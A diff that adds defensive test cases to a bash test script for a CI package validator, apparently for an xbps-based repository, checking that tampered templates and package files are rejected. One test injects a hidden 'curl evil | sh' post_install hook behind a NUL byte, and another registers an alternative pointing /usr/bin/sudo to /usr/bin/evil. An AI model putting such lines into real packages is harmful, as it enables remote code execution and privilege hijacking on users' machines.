@@ -126,6 +126,39 @@ fresh; good_a; printf 'evil\ta\t1.1_1\n' > "$T/out/passed.tsv"
 aborted "unknown status" "unknown status"
 fresh; good_a; printf 'bump\ta\t1.1_1\textra\n' > "$T/out/passed.tsv"
 aborted "wrong field count" "malformed line"
+# parser differentials: what the validator reads must be what bash, diff and xbps will read
+fresh; good_a; printf '\0post_install() { curl evil | sh; }\n' >> "$T/out/templates/a/template"
+aborted "NUL byte hiding a change from diff" "NUL"
+fresh; good_a; sed -i 's/^build_style=meson$/build_style=meson\r/' "$T/out/templates/a/template"
+aborted "carriage return in a template" "carriage return"
+fresh; good_a; printf 'bump\t\ta\t1.1_1\n' > "$T/out/passed.tsv"
+aborted "collapsed tab fields in passed.tsv" "malformed line"
+fresh; good_a; printf 'b\t\t2.0\n' > "$T/out/failed.tsv"
+aborted "collapsed tab fields in failed.tsv" "malformed line"
+swap() { # <file name> <xbps-create args...>: replace a package file by one with other real metadata
+	local name=$1; shift
+	rm -f "$T/out/xbps/$name"
+	(cd "$T/out/xbps" && xbps-create -q "$@" "$T/empty" >/dev/null)
+}
+fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n evil-9.9_1 -s t; mv "$T/out/xbps/evil-9.9_1.noarch.xbps" "$T/out/xbps/a-1.1_1.noarch.xbps"
+aborted "file name that disagrees with the package metadata" "metadata"
+fresh; good_a; swap a-1.1_1.noarch.xbps -A x86_64 -n a-1.1_1 -s t; mv "$T/out/xbps/a-1.1_1.x86_64.xbps" "$T/out/xbps/a-1.1_1.noarch.xbps"
+aborted "architecture that disagrees with the file name" "metadata"
+fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -R "glibc>=0"
+aborted "package that replaces another" "declares replaces"
+fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "glibc-9999_1"
+aborted "package that provides another" "declares provides"
+fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -C "glibc>=0"
+aborted "package that conflicts with another" "declares conflicts"
+fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libc.so.6"
+aborted "package that provides a foreign soname" "shlib"
+fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --alternatives "sudo:/usr/bin/sudo:/usr/bin/evil"
+aborted "package that registers an alternative" "alternatives"
+# ... while a subpackage with a soname of its own is fine
+fresh; good_a; swap a-devel-1.1_1.noarch.xbps -A noarch -n a-devel-1.1_1 -s t --shlib-provides "liba.so.1"
+out=$(run) && rc=0 || rc=$?
+assert_eq   "a package providing its own soname is accepted" "$rc" "0"
+
 fresh; good_a; out=$(env -u VOIDLAB_PRIVKEY CI_AUTO_UPDATE_FORCE=1 BASE_BRANCH=main BUILD_OUT=$T/out bash -c 'cd "$1" && bash tools/ci-publish.sh' _ "$T/work" 2>&1 || true)
 assert_grep "missing key is an error"           'no VOIDLAB_PRIVKEY' <(echo "$out")
 assert_eq   "missing key stops before any PR"   "$(grep -c 'pr ' "$T/gh.log" || true)" "0"
